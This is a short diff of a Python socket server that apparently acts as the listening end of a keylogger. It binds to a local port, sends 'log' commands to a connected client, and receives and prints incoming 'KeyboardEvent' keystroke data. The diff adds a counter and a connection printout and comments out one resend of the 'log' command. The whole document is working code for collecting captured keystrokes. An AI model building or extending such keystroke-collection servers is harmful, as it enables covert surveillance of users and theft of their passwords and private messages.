@@ -3,20 +3,22 @@ import time
 # Enter IP and Port here
 HOST = '127.0.0.1'
 PORT = 4420
+logger = 0
 # Configure socket connection
 z = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 z.bind((HOST, PORT))
 z.listen(5)
 print('> Started main server: ' + str(HOST) + ' (' + str(PORT))
 x,y = z.accept()
-#print('> Client connected: ' + str(y) + 'the x is : ' + str(x))
+print('> Client connected: ' + str(y) + 'the x is : ' + str(x))
 # Wake up
 while True:
     data = x.recv(1024)
     if data.decode() == 'ready': x.send('log'.encode())
     if data.decode().__contains__('KeyboardEvent'): 
+        logger +=1
         print('keys received')
-        x.send('log'.encode())
+        #x.send('log'.encode())
         print(data.decode())
         time.sleep(1)
         
